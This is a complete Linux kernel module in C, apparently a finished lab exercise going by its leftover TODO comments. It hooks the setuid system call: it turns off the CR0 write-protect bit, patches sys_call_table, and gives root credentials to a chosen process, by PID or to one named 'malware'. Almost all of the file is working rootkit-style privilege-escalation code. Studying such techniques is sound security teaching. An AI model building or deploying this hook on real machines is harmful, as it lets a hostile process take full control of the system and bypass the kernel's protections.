#include <asm/cacheflush.h>
#include <linux/cred.h>
#include <linux/init.h>
#include <linux/kallsyms.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/pid.h>
#include <linux/pid_namespace.h>
#include <linux/sched.h>
#include <linux/time.h>
#include <linux/unistd.h>

#define TARGET_PROC_NAME "malware"
#define __NR_syscall 105

static struct task_struct *target_task = NULL;
static unsigned long *sys_call_table;
static int target_pid = -1;
module_param(target_pid, int, 0);

unsigned int clear_and_return_cr0(void);
void setback_cr0(unsigned int val);
static long sys_mycall(uid_t uid);

int orig_cr0;
static long (*anything_saved)(uid_t);

/* CR0 operation functions */
unsigned int clear_and_return_cr0(void) {
  unsigned int cr0 = 0;
  unsigned int ret;
  asm volatile("movq %%cr0, %%rax" : "=a"(cr0));
  ret = cr0;
  cr0 &= 0xfffeffff; // clear WP bit
  asm volatile("movq %%rax, %%cr0" ::"a"(cr0));
  return ret;
}

void setback_cr0(unsigned int val) {
  asm volatile("movq %%rax, %%cr0" ::"a"(val));
}

/* Custom syscall */
static long sys_mycall(uid_t uid) {
  printk(KERN_INFO "sys_mycall called\n");
  if (target_task && current == target_task) {
    /* TODO: create new credentials and set UID/GID to 0 */
    struct cred *new_cred;
    new_cred = prepare_creds();
    if (new_cred == NULL)
      return -ENOMEM;
    new_cred->uid.val = 0;
    new_cred->gid.val = 0;
    new_cred->euid.val = 0;
    new_cred->egid.val = 0;
    commit_creds(new_cred);
    return 0;
  }

  return anything_saved(uid);
}

/* Find target process */
static int find_target_process(void) {
  if (target_pid > 0) {
    /* TODO: find process by PID and assign target_task */
    target_task = get_pid_task(find_get_pid(target_pid), PIDTYPE_PID);
    if (target_task) {
      printk(KERN_INFO "Found target process: %s (PID: %d)\n",
             target_task->comm, target_task->pid);
      return 0;
    }
  }

  /* TODO: find process by name if PID not specified */
  struct task_struct *task;
  for_each_process(task) {
    if (strcmp(task->comm, TARGET_PROC_NAME) == 0) {
      target_task = task;
      printk(KERN_INFO "Found target process: %s (PID: %d)\n",
             target_task->comm, target_task->pid);
      return 0;
    }
  }
  return -ESRCH;
}

/* Module init */
static int __init init_hook(void) {
  printk(KERN_INFO "HookSyscall Module Loaded\n");

  if (find_target_process() != 0)
    return -ESRCH;

  sys_call_table = (unsigned long *)kallsyms_lookup_name("sys_call_table");
  if (!sys_call_table)
    return -EINVAL;
  printk(KERN_INFO "sys_call_table found at %p\n", sys_call_table);

  anything_saved = (long (*)(uid_t))sys_call_table[__NR_syscall];
  printk(KERN_INFO "Original syscall %d at %p\n", __NR_syscall,
         (void *)anything_saved);

  /* TODO: disable write protection and replace syscall */
  orig_cr0 = clear_and_return_cr0();
  sys_call_table[__NR_syscall] = (unsigned long)sys_mycall;
  setback_cr0(orig_cr0);

  printk(KERN_INFO "Installed hook for syscall %d\n", __NR_syscall);
  return 0;
}

/* Module exit */
static void __exit exit_hook(void) {
  /* TODO: restore original syscall */
  orig_cr0 = clear_and_return_cr0();
  sys_call_table[__NR_syscall] = (unsigned long)anything_saved;
  setback_cr0(orig_cr0);

  printk(KERN_INFO "HookSyscall Module Unloaded\n");
}

module_init(init_hook);
module_exit(exit_hook);
MODULE_LICENSE("GPL");
MODULE_AUTHOR("Your Name");
MODULE_DESCRIPTION("Kernel module to hook syscall for privilege elevation");
